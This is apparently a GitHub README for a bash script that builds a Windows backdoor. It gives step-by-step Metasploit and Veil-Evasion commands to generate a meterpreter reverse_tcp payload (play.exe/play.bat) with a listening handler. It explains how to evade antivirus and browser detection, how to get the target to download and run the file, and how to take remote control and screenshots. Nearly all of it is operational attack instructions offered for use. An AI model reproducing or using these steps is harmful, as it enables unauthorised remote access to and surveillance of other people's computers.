# cybersecurity 

This bashscript runs metasploit framework's msfconsole and opens backdoor in windows machine.

### Installation
- Download the script in the repository and move to a directory 
  OR
  ```sh
  git clone https://github.com/meanishn/cybersec.git
  ```
- change to the directory with script file
- Run
  ```sh
    ./hack.sh
  ```
- After a while you should be able to see meterpreter console
  ```sh
    meterpreter>
  ```
- In the current directory you should be able to see the executable named ``` play.exe ```

The executable file play.exe should be sent to the target machine (windows xp/7). 
When this executable is opened in target machine(windows) then in your host machine(kali) you have a meterpreter console running
with full access to the windows machine.

NOTE: If you are downloading, use internet Explorer to download this exe file. Other browsers will detect this as virus and wont allow you to download.

To test the attack, type ``` screenshot ``` in the meterpreter console. You should get the screenshot image from your target machine.

//TODO
Make this play.exe undetectable by antivirus and browser

### Details
Requirements: msfconsole (pre-installed with kali), veil-evasion
- Install git
  ```sh
    sudo apt-get install -y git
  ```
- Installing veil-evasion

  veil evasion is used so just to make sure that the payload that is created is not detected as virus.
  ```sh
  git clone https://github.com/Veil-Framework/Veil.git
  cd Veil/
  cd setup
  sudo ./setup.sh -c
  ```
  This will install all the dependencies Python 2.7, Py2Exe, PyCrypto,

### How to make attack
  After the veil evasion is installed correctly, type ```veil-evasion``` in terminal.
  
  This should open veil-evasion console. Type ```list``` to see available payloads that can be created.
  For this project we are going to create a powershell shellcode payload. 
  
  As of version 2.28.2 of veil-evasion, we are going to use 
  ```powershell/shellcode_inject_virtual/virtual```payload whose id is 28.
 
 - Go ahead and type
  ```bash 
  use 28 
  ```
  NOTE: The id may be different depending on the version of veil evasion
  
  - In the next console screen. Type:
  ```bash
    generate
  ```
 - Now it asks for option if we want to use msfvenom shellcode. We will be using msfvenom so select 1 (default).
 - You should get the prompt asking for metasploit payload. We will be using meterpreter reverse tcp. so type and press enter
  ```bash
    windows/meterpreter/reverse_tcp
  ```
- Next, we have to provide LHOST, give your local ip: ``` 192.168.10.X```
- Next it asks for LPORT, give it any available port: 443
- Finally, it asks for name of output file. Give any name and press enter (lets say 'play')
  After following these steps, two files should have been created:
  ```bash
    Payload File: /var/lib/veil-evasion/output/source/play.bat
    Handler File: /var/lib/veil-evasion/output/handlers/play_handler.rc
  ```
  
- Exit from veil evasion ```exit```
- Lets start the msfconsole session by using the handler file generated by veil evasion
  ```bash
    msfconsole -r /var/lib/veil-evasion/output/handlers/play_handler.rc
  ```
- Now, we need to transfer the payload file (/var/lib/veil-evasion/output/source/play.bat) to our target machine.
- This file should bypass windows defender and other antivirus and browsers should let you download the file. After downloading execute this batch file.
- In our host machine (kali), we should be able to see the message
  ```bash
    Meterpreter session 1 opened (192.168.....) 
  ```
- Type ```sessions``` to see all session information and make note of id of the session.
- Type ``` sessions -i [ID] ``` to start interacting with target machine
- Finally you should be able to see ```meterpreter>``` console. To test type ```screenshot``` to take screenshot from target machine.
- Enjoy!!!
 
 
  
  
